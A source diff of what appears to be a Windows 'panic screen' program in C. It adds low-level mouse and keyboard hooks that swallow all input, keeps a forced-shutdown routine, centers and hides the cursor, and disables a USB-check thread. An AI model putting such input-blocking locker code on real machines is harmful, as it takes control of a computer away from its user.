@@ -29,40 +29,10 @@ void AddLog(const wchar_t *fmt, ...) {
     InvalidateRect(g_hwnd, NULL, TRUE); //redraw call
 }
 
-BOOL Shutdown(BOOL bReboot) {
-	HANDLE hToken;
-	TOKEN_PRIVILEGES tkp;
-
-	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
-		return FALSE;
-
-	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
-
-	tkp.PrivilegeCount = 1;
-	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-	// need to adjust privileges to allow user to shutdown
-	if(!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES) NULL, 0))
-		return FALSE;
-
-	if(!InitiateSystemShutdown(NULL, NULL, 0, TRUE, bReboot))
-		return FALSE;
-
-	tkp.Privileges[0].Attributes = 0;
-
-	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES) NULL, 0);
-
-	return TRUE;
-}
-
 void CursorToCenter() {
     int x = GetSystemMetrics(SM_CXSCREEN) / 2;
     int y = GetSystemMetrics(SM_CYSCREEN) / 2;
     SetCursorPos(x,y);
-}
-
-LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam){
-    return 1;
 }
 
 DWORD WINAPI LoggerThread(LPVOID lp) {
@@ -172,6 +142,40 @@ DWORD WINAPI EnumerateUSBDevices(LPVOID lp) {
     SetupDiDestroyDeviceInfoList(deviceInfoSet); //Long ass function name
 }
 
+LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    return 1;
+}
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    return 1;
+}
+
+BOOL Shutdown(BOOL reboot) {
+	HANDLE hToken;
+	TOKEN_PRIVILEGES tkp;
+
+	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+		return FALSE;
+
+	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
+
+	tkp.PrivilegeCount = 1;
+	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+	// need to adjust privileges to allow user to shutdown
+	if(!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES) NULL, 0))
+		return FALSE;
+
+	if(!InitiateSystemShutdown(NULL, NULL, 0, TRUE, reboot))
+		return FALSE;
+
+	tkp.Privileges[0].Attributes = 0;
+
+	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES) NULL, 0);
+
+	return TRUE;
+}
+
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     switch (msg){
         case WM_PAINT:
@@ -220,7 +224,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmd, int nCmdSh
         NULL, NULL, hInstance, NULL
     );
 
-    SetTimer(g_hwnd, 1, 10, NULL); // Timer for the mouse center lock
+    SetTimer(g_hwnd, 1, 10, NULL); // Timer for the cursor center lock
 
     ShowWindow(g_hwnd, SW_SHOW);
     ShowCursor(FALSE);
@@ -228,7 +232,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmd, int nCmdSh
     /*AddLog(L"[+] Panic screen initialized");
     AddLog(L"[+] Checking USB ports...");
     AddLog(L"[!] System locked");*/
-    CreateThread(NULL, 0, EnumerateUSBDevices, NULL, 0, NULL);
+    //CreateThread(NULL, 0, EnumerateUSBDevices, NULL, 0, NULL);
     
 
     MSG msg;
